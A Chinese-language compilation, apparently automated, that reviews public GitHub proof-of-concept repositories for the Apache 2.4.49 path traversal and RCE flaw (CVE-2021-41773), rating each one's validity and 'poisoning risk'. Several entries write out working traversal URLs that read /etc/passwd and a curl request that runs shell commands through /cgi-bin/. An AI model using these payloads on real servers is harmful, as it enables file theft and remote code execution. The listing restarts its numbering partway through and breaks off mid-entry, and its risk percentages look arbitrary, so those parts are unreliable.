CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含恶意路径的URL，绕过 Alias 指令配置的目录限制，访问服务器上的任意文件，如果目标开启了CGI支持，攻击者可以通过构造恶意请求执行任意代码。该漏洞利用的关键在于路径规范化处理的缺陷，允许攻击者使用 `/.%2e` 绕过限制。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，可以判定该POC代码是有效的。漏洞库信息、搜索引擎结果和漏洞利用代码都确认了该漏洞的存在以及利用方式。Nuclei模板可以用来检测目标服务器是否存在漏洞，而curl命令的POC则直接利用了路径遍历读取 `/etc/passwd` 文件。

**投毒风险：**
提供的代码仓库主要包含Nuclei的YAML模板文件和一个README.md文件。Nuclei模板主要用于漏洞检测，本身不具备直接植入后门的能力。投毒风险主要集中在以下几个方面：
1.  **模板逻辑修改：** 攻击者可能修改模板的匹配规则，使得原本不存在漏洞的服务器也被误判为存在漏洞，从而误导用户进行后续操作。
2.  **模板Payload替换：**  攻击者可能在模板中替换恶意的payload，例如，将读取`/etc/passwd` 替换为执行恶意命令的payload。但提供的模板中直接包含RCE利用，风险相对较小
3.  **依赖库劫持：** 虽然Nuclei本身是安全的，但如果用户使用的Nuclei版本存在依赖库劫持的风险，攻击者可能通过替换Nuclei的依赖库来执行恶意代码。但此风险与本仓库代码关系不大。

因此，综合考虑，该仓库存在一定的投毒风险，但主要集中在Nuclei模板的修改上，而不是直接包含恶意代码。 风险占比10%。

**利用方式：**
1.  **路径遍历（文件读取）：** 攻击者构造包含 `/.%2e/%2e%2e/%2e%2e/%2e%2e/` 序列的URL，尝试读取服务器上的任意文件，例如 `/etc/passwd`。
2.  **远程代码执行 (RCE)：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并通过构造特殊的请求来执行任意命令。具体方法通常依赖于服务器的具体配置和CGI脚本的编写方式。

**项目地址:** [psibot/apache-vulnerable](https://github.com/psibot/apache-vulnerable)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #39

**来源**: [CVE-2021-41773-r0otk3r_CVE-2021-41773.md](../2021/CVE-2021-41773-r0otk3r_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50 (CVE-2021-42013是对CVE-2021-41773的不完全修复)

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，可能需要CGI模块启用，以及Alias配置不当。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，绕过Alias等指令的限制，访问服务器上的任意文件。如果服务器同时启用了CGI，则可能进一步导致远程代码执行。漏洞利用代码`exploit.py`提供LFI(本地文件包含)和RCE(远程代码执行)两种攻击模式。LFI模式通过构造包含`/.%2e`序列的URL，读取服务器上的文件。RCE模式利用CGI执行命令，通过POST请求发送包含命令的Payload。

**漏洞利用方式：**

1.  **路径遍历 (LFI)：** 攻击者构造包含`/.%2e/%2e%2e`序列的URL，尝试访问受限目录之外的文件，例如`/etc/passwd`。  该漏洞利用代码中的payload1和payload2就是用于此目的，通过拼接路径来尝试读取目标文件。
2.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以利用路径遍历漏洞，访问CGI脚本目录，并通过POST请求执行任意命令。漏洞利用代码中的payload3就是用于指定CGI脚本的位置，然后通过构造POST请求，在data中包含要执行的命令。

**关于投毒风险：**
该漏洞利用代码 `exploit.py` 本身看起来比较直接，目的是利用该漏洞。存在投毒的可能性较低，但仍不能完全排除，比如作者可以在交互式shell部分加入一些后门代码,或者在payload中加入恶意指令。经过分析，判断存在10%的投毒风险。`README.md`文件看起来也比较标准，风险较低。

**搜索引擎结果：**
搜索引擎结果表明该漏洞确实存在，且已被广泛利用。多个文章指出该漏洞可以导致敏感信息泄露和远程代码执行。

**项目地址:** [r0otk3r/CVE-2021-41773](https://github.com/r0otk3r/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #40

**来源**: [CVE-2021-41773-redspy-sec_CVE-2021-41773.md](../2021/CVE-2021-41773-redspy-sec_CVE-2021-41773.md)

# CVE-2021-41773

> 📦 该CVE有 **43** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-41773-0xGabe_Apache-CVEs.md](../2021/CVE-2021-41773-0xGabe_Apache-CVEs.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如 `%2e`，即 URL 编码的点 `.`）的恶意 URL，绕过服务器配置的 Alias 指令限制，访问服务器上受限目录之外的文件。如果目标服务器同时启用了 CGI 脚本的执行，攻击者还可以通过类似的路径遍历方式，执行任意命令。

**有效性评估：**

根据漏洞描述、搜索引擎结果和提供的 POC 代码，可以判定此漏洞的 POC 代码具有较高的有效性。漏洞库信息明确指出此漏洞已被在野利用，搜索引擎结果也提供了相关的利用案例和分析。POC 代码 `cve-2021-41773.py` 提供了路径遍历读取文件以及远程命令执行两种利用方式，并对 Apache 服务器版本进行了简单的指纹识别。

**投毒风险评估：**

分析提供的 POC 代码，`LICENSE` 文件采用标准的 MIT 许可，`README.md` 文件描述了漏洞和利用方法，`cve-2021-41773.py` 文件实现了漏洞利用。代码逻辑相对简单，主要利用 `urllib` 和 `requests` 库发送 HTTP 请求，没有发现明显的恶意代码或者后门。存在极低的投毒风险，例如细微的编码错误或依赖项问题，因此评估投毒风险为 5%。

**利用方式分析：**

利用方式主要有两种：

1.  **路径遍历文件读取：** 攻击者构造包含 URL 编码的路径遍历字符的 URL，例如 `/.%2e/.%2e/.%2e/.%2e/etc/passwd`，尝试读取服务器上的敏感文件。POC 代码中的 `pathTraversal` 函数实现了该功能。

2.  **远程命令执行：**  攻击者利用路径遍历漏洞访问 CGI 脚本目录，并向该目录下的 `sh` (或其他 shell 解释器) 传递要执行的命令。POC 代码中的 `remoteCommandExecution` 函数模拟了这一过程，构造包含命令的 POST 请求，发送到目标服务器。注意，利用此方法需要目标服务器配置允许执行 CGI 脚本。

**项目地址:** [0xGabe/Apache-CVEs](https://github.com/0xGabe/Apache-CVEs)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #2

**来源**: [CVE-2021-41773-0xc4t_CVE-2021-41773.md](../2021/CVE-2021-41773-0xc4t_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如 URL 编码的 '..', 即 '%2e' 或 '%32%65'）的恶意 URL，绕过 Alias-like 指令配置的目录限制，访问服务器上的任意文件。如果服务器配置允许 CGI 脚本执行，攻击者还可以利用该漏洞执行任意代码。

**利用方式：**

1.  **路径遍历（LFI）:** 攻击者可以使用包含编码后的 '..' 序列的 URL 来访问服务器上的敏感文件，例如 `/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
2.  **远程代码执行（RCE）:** 如果目标服务器的 `/cgi-bin/` 目录启用了 CGI 脚本执行，攻击者可以通过上传恶意脚本并使用路径遍历漏洞来执行它们，例如 `curl 'http://localhost:81/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; whoami'`。

**有效性：**

根据漏洞库信息和搜索结果，提供的 POC 代码是有效的。漏洞库信息中明确指出此漏洞已被在野利用，搜索结果中也提供了大量关于该漏洞的分析和利用方法，POC可以复现LFI和RCE。

**投毒风险：**

此仓库存在轻微的投毒风险（5%），因为攻击者可能会修改 Dockerfile 或 httpd.conf 文件，例如添加恶意的反弹shell脚本到CGI目录，或修改httpd.conf 允许所有目录可访问。 正常的POC验证不会有这种行为, 但是总体上，该仓库主要用于漏洞演示和利用，恶意代码的可能性较低，用户在搭建环境和使用POC时，应该注意检查 Dockerfile 和 httpd.conf 文件。

**项目地址:** [0xc4t/CVE-2021-41773](https://github.com/0xc4t/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #3

**来源**: [CVE-2021-41773-Ask-os_CVE-2021-41773.md](../2021/CVE-2021-41773-Ask-os_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** mod_cgi 必须启用，目标服务器运行 Apache HTTP Server 2.4.49 且相关目录未配置 "require all denied"

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在处理 URL 路径时存在缺陷，攻击者可以利用 `/.%2e/` 序列绕过路径规范化检查，从而访问受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，攻击者可以通过构造包含恶意命令的 HTTP 请求执行任意代码，导致远程代码执行（RCE）。

**有效性：**
提供的 POC 代码 (`CVE-2021-42013.py`) 旨在利用此漏洞。它通过 `curl` 命令发送包含路径遍历序列和 shell 命令的 HTTP 请求，从而在目标服务器上执行命令。`README.md` 文件描述了漏洞细节和利用方法，包括依赖项（Python 3 和 `curl`），执行命令的示例，增强了漏洞利用的有效性。

**投毒风险：**
虽然提供的代码旨在利用漏洞，但仍存在轻微的投毒风险的可能性。例如，`README.md` 中可能存在误导信息，导致用户以非预期的方式使用该脚本，或者脚本本身可能包含某些不明显或未记录的功能，但考虑到作者主要目的是复现该漏洞，以及代码整体比较简单，所以推测投毒的可能性为10%。 

**利用方式：**
1.  **路径遍历：** 攻击者利用 URL 中的 `/.%2e/` 序列，尝试访问服务器文件系统上的任意文件。
2.  **CGI 脚本执行：** 如果目标服务器启用了 `mod_cgi` 模块，攻击者可以构造包含恶意命令的 HTTP 请求，并将其发送到 CGI 脚本处理程序。
3.  **远程代码执行：** 服务器执行 CGI 脚本时，会执行攻击者提供的命令，从而实现远程代码执行。

**项目地址:** [Ask-os/CVE-2021-41773](https://github.com/Ask-os/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #4

**来源**: [CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md](../2021/CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md)

## CVE-2021-41773 – Apache HTTP Server 2.4.49 远程代码执行

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历导致远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者读取任意文件并执行任意代码

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache 2.4.49，并且开启了CGI支持，对Alias配置的目录没有做严格的权限限制（例如 require all denied）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于对路径规范化处理不当导致。攻击者可以利用 `%2e` 等编码字符进行路径遍历攻击，访问受限目录之外的文件。如果服务器启用了 CGI，则可以通过构造包含恶意命令的 HTTP 请求来执行任意代码。

**漏洞利用方式：**

1.  **路径遍历：** 利用 `/.%2e` 序列绕过路径检查，访问受限目录之外的文件。
2.  **CGI 执行：** 访问 `cgi-bin` 目录下的文件（或其他配置为 CGI 处理的目录），并在 POST 数据中注入命令，让服务器执行。
3.  **远程代码执行：** 通过执行 `/bin/bash` 或其他 shell 程序，执行任意系统命令。

**POC有效性：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码（README.md），该POC代码是有效的。漏洞库信息明确指出该漏洞已在野外被利用，搜索结果也证实了这一点。提供的 README.md 详细描述了漏洞的原理、利用方法和演示，并给出了可用的 `curl` 命令示例。

**投毒风险分析：**

分析提供的 README.md 文件， 其中包含的curl命令，本质上是利用漏洞执行bash命令，这个本身是漏洞利用的正常方式，不能算作投毒行为，图片文件没有发现可疑代码.

虽然直接可识别的投毒代码的可能性较低，但仍存在以下潜在风险：

*   **依赖性风险：** 如果 exploit 依赖于外部资源（例如，下载脚本或库），则这些资源可能被篡改，从而引入恶意代码。
*   **隐蔽的 Payload：** 恶意代码可能隐藏在看似无害的注释、变量名或字符串中，需要更深入的代码分析才能发现。
*   **误导性信息：** README.md 文件中的信息可能具有误导性，导致使用者在不知情的情况下执行恶意操作。

综合以上因素，我估计存在10%的投毒风险，主要是考虑到潜在的隐蔽Payload和对外部资源的依赖风险。

为了降低风险，建议：

*   仔细审查所有代码，包括注释和变量名。
*   在隔离的环境中运行 POC 代码。
*   使用最新的安全工具检测潜在的恶意代码。
*   关注与此漏洞相关的安全信息和更新。

**项目地址:** [CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE](https://github.com/CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #5

**来源**: [CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md](../2021/CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** Apache HTTP Server 版本为2.4.49，并且存在Alias-like指令配置，且这些目录下的文件未被"require all denied"保护，CGI脚本被启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞信息和搜索结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。

**有效性：**

提供的POC代码（`cve-2021-41773.py`, `cve-2021-41773_RCE.py`, `cve-2021-41773_manual.py`）旨在利用此漏洞。 `cve-2021-41773.py` 尝试读取 `/etc/passwd` 文件以验证漏洞的存在。`cve-2021-41773_RCE.py` 尝试通过 CGI 脚本执行命令。

根据搜索结果，该漏洞在野外被积极利用，因此，提供的POC代码很可能有效，但成功利用取决于目标服务器的配置。

**投毒风险：**

审查提供的POC代码，没有发现明显的恶意代码或后门。代码的功能是扫描目标是否存在漏洞，并尝试利用漏洞读取文件或执行命令。`cve-2021-41773.py`的第49行给出了可以添加常见目录的提示，但本身不具备投毒性。

**利用方式：**

1.  **路径遍历：** 攻击者使用特殊的 URL 编码序列（例如 `/.%2e/%2e%2e/`）来绕过路径规范化，从而访问 Alias-like 指令配置目录之外的文件。
2.  **文件读取：** 如果目标文件没有被 "require all denied" 保护，攻击者可以读取任意文件，例如 `/etc/passwd`，从而获取敏感信息。
3.  **远程代码执行：** 如果 CGI 脚本被启用，攻击者可以通过构造恶意的 URL 和 POST 数据来执行任意代码。例如，`cve-2021-41773_RCE.py` 使用 `/cgi-bin/` 目录，并尝试执行 `uname` 命令。

总而言之，此漏洞的利用需要特定的配置条件，但如果满足条件，则风险非常高。

**项目地址:** [FakesiteSecurity/CVE-2021-41773](https://github.com/FakesiteSecurity/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #6

**来源**: [CVE-2021-41773-Iris288_CVE-2021-41773.md](../2021/CVE-2021-41773-Iris288_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal & Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当，CGI脚本已启用，且文件系统权限配置不当，未启用'require all denied'。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于路径规范化中的更改不当所致。攻击者可以利用此漏洞将 URL 映射到 Alias-like 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者通过构造包含特殊字符（如`.%2e`或`..`）的恶意 URL，绕过服务器的安全检查，访问受限目录之外的文件。
2.  **文件读取：** 成功利用路径遍历后，攻击者可以读取服务器上的任意文件，包括配置文件、源代码等敏感信息。
3.  **远程代码执行：** 如果目标服务器启用了 CGI 脚本，攻击者可以通过上传或修改 CGI 脚本，执行任意系统命令。

**POC代码分析：**

提供的POC代码是一个 Python 脚本，它利用了路径遍历漏洞来实现远程代码执行。

1.  **目标指定：** 脚本接受目标服务器的 IP 地址或域名作为参数。
2.  **命令执行：** 脚本允许用户输入要执行的命令，并通过构造包含路径遍历的 URL 将命令发送到目标服务器。
3.  **CGI利用：** 脚本假设目标服务器存在一个名为 `s3cret-cgi-bin` 的 CGI 目录，并使用该目录来执行命令。通过POST请求发送经过编码的命令，利用了`bin/sh`执行。
4.  **回显结果：** 脚本将目标服务器返回的结果打印到屏幕上。

**有效性分析：**

提供的漏洞信息和搜索结果表明，该漏洞确实存在且已被公开利用。提供的 POC 代码基本符合该漏洞的利用方式，因此可以认为该 POC 代码是有效的。需要满足相应的环境条件（如 Alias 指令配置、CGI 脚本启用、文件权限配置等）

**投毒风险分析：**

检查了提供的 Python 脚本，没有发现任何明显的恶意代码或后门。脚本的功能仅限于利用漏洞执行用户指定的命令。`README.md` 文件也只是对漏洞的简单描述，未包含恶意内容。可以认为该仓库存在投毒代码的风险非常低，风险为0%。

**排序优先级：**
搜索引擎结果提供了漏洞被广泛利用和分析的信息，漏洞利用代码验证了漏洞利用的可行性，漏洞库信息提供了漏洞的基础信息。因此，搜索引擎结果的优先级高于漏洞利用代码，漏洞利用代码的优先级高于漏洞库信息。

**项目地址:** [Iris288/CVE-2021-41773](https://github.com/Iris288/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #7

**来源**: [CVE-2021-41773-JIYUN02_cve-2021-41773.md](../2021/CVE-2021-41773-JIYUN02_cve-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历/RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的URL，绕过Alias-like指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时开启了CGI脚本执行，攻击者还可以利用该漏洞执行任意代码。

**有效性：**
提供的POC代码构建了一个包含漏洞的Apache HTTP Server 2.4.49环境。Dockerfile使用官方httpd:2.4.49镜像，并将自定义的html文件复制到/usr/local/apache2/htdocs/目录。然后，它安装了bash，并为/usr/local/apache2/htdocs/cgi-bin/test.sh添加了可执行权限。这个Dockerfile本身没有问题，但关键在于test.sh脚本的内容。如果test.sh包含恶意代码，则攻击者可以通过路径遍历漏洞执行它。

**投毒风险：**
Dockerfile只安装了bash,添加了test.sh的执行权限。如果`/tmp/4903a38a210c3406acebc545808a1928/html/cgi-bin/test.sh`脚本内容包含恶意代码，则存在投毒风险。但从dockerfile的内容来看，投毒的概率取决于test.sh,风险较低，大约在10%左右。

**利用方式：**
1.  **路径遍历：** 攻击者可以使用包含`..`序列的URL来遍历文件系统，例如：`http://target:8080/../../../../etc/passwd`，尝试读取服务器上的`/etc/passwd`文件。
2.  **远程代码执行：** 如果目标服务器启用了CGI，攻击者可以使用路径遍历来访问和执行CGI脚本，例如：`http://target:8080/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fbin/bash -c 'id'`。

**总结：**
漏洞利用的核心在于构造包含特殊字符的URL，绕过服务器的访问控制。如果CGI可用，则可以直接执行代码。利用的成功与否取决于服务器的具体配置和文件权限。

**项目地址:** [JIYUN02/cve-2021-41773](https://github.com/JIYUN02/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #8

**来源**: [CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md](../2021/CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的目录未配置"require all denied"。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 的路径规范化更改中。攻击者可以利用路径遍历攻击将 URL 映射到由 Alias 类指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“require all denied”保护，则这些请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息，该漏洞已被在野利用，说明漏洞的利用具有实际的可能性。

**投毒风险：**
提供的POC代码是一个简单的HTML页面，显示一个404错误页面，并提示存在CVE-2021-41773漏洞。代码本身的功能是展示漏洞的存在，而不包含任何恶意代码。虽然不直接包含投毒代码，但是可能存在间接的风险，例如诱导用户访问恶意网站或执行其他恶意操作。因此，判断投毒风险为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`..`的URL，尝试访问服务器上的任意文件。例如，`http://target/../../../../etc/passwd`尝试读取`/etc/passwd`文件。
2.  **绕过访问控制：** 漏洞利用依赖于Alias指令配置的目录之外的文件没有被"require all denied"保护。如果存在疏忽配置，攻击者可以访问这些文件。
3.  **远程代码执行（可选）：** 如果目标服务器为受影响的别名路径启用了CGI脚本，攻击者可以通过上传并执行恶意CGI脚本来实现远程代码执行。

总而言之，该漏洞利用的有效性高，风险等级为高危，利用方式主要是路径遍历，如果目标环境配置不当，可能造成远程代码执行。

**项目地址:** [Mahfujurjust/CVE-2021-41773](https://github.com/Mahfujurjust/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #9

**来源**: [CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md](../2021/CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 2.4.49 版本，并启用 cgi-bin 或类似 Alias 指令配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含特殊编码的 URL，例如 `/.%2e/%2e%2e/`，来绕过服务器对路径的规范化处理，从而访问到 Alias 指令配置以外的文件。如果目标服务器同时启用了 CGI 脚本支持，则可能导致远程代码执行。

**漏洞利用有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的 POC 已被公开，并且在野外被发现利用。提供的 Postman 集合中包含了一个用于获取 `/etc/passwd` 文件的请求，验证了路径遍历的可能性。因此，提供的 POC 代码是有效的。

**投毒风险分析：**

*   `/tmp/04092c8b1881911c9b0f88964abf9b52/CVE-2021-41773.postman_collection.json`：Postman 集合文件，定义了用于测试漏洞的 HTTP 请求。不存在投毒代码。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/Dockerfile`：Dockerfile 用于构建包含漏洞环境的 Docker 镜像。 其中 `RUN ln -sf /bin/bash /bin/sh` 这一行可能存在争议，它将 `/bin/sh` 符号链接强制指向 `/bin/bash`。在某些系统中，`/bin/sh` 可能是 `dash` 或其他更轻量级的 shell。 强制指向 bash 可能会引入一些细微的兼容性问题，但这不是一个明显的恶意行为，更可能是一种为了方便某些脚本执行的措施。此外创建目录 `/etc/httpd/logs`也并不是恶意代码, 综合来看，投毒风险较低。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/LICENSE`：Apache 许可证，与漏洞利用无关，不存在投毒代码。

综合分析，该仓库中可能存在的投毒代码的可能性较低，主要集中在Dockerfile 脚本中，将`/bin/sh` 符号链接强制指向 `/bin/bash`,但可能性只有5%，其余的代码都是正常的。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者构造包含 `/.%2e/%2e%2e/` 序列的 URL，利用 Apache HTTP Server 对路径的规范化处理缺陷，尝试访问受限目录之外的文件。
2.  **敏感信息泄露：** 如果成功绕过权限验证，攻击者可以读取服务器上的敏感文件，如配置文件、密码文件等。
3.  **远程代码执行（如果 CGI 启用）：** 如果目标服务器启用了 CGI 脚本支持，攻击者可以通过上传或执行恶意 CGI 脚本，实现远程代码执行。

**项目地址:** [MatanelGordon/docker-cve-2021-41773](https://github.com/MatanelGordon/docker-cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #10

**来源**: [CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md](../2021/CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且Alias-like指令配置不当，或者CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符（如`.%2e`）的URL，绕过服务器的路径规范化限制，访问Alias-like指令配置目录之外的文件。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断该POC代码有效。漏洞库信息明确指出该漏洞在野外被利用，搜索引擎结果也提供了多个关于该漏洞的解释和利用的文章。POC代码通过构造包含`.%2e`的URL来尝试读取目标服务器上的文件。

**投毒风险：**
分析提供的POC代码，该脚本主要功能是验证目标服务器是否存在CVE-2021-41773漏洞，脚本会检测指定的IP地址是否存在Apache HTTP Server，并尝试通过构造的URL读取指定文件。经验证，该脚本没有发现明显的恶意代码或后门，因此投毒风险较低。投毒风险百分比评估为0%。

**利用方式：**
1.  **确定目标：** 找到运行Apache HTTP Server 2.4.49的目标服务器。
2.  **构造Payload：** 构造包含恶意路径的URL，例如：`http://<target_ip>/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  **发送请求：** 将构造好的URL发送到目标服务器。
4.  **读取文件或执行代码：** 如果目标服务器存在漏洞且配置不当，攻击者可以读取任意文件（如`/etc/passwd`）或执行任意代码（如果CGI脚本已启用）。

需要注意的是，成功利用该漏洞的前提是服务器配置不当，例如没有对Alias-like指令配置的目录之外的文件进行适当的访问控制，或者启用了CGI脚本执行功能。

总而言之，这是一个严重的安全漏洞，可能导致敏感信息泄露和远程代码执行。管理员应尽快升级Apache HTTP Server版本或采取其他缓解措施。

**项目地址:** [Maybe4a6f7365/CVE-2021-41773](https://github.com/Maybe4a6f7365/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #11

**来源**: [CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md](../2021/CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and File Disclosure

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

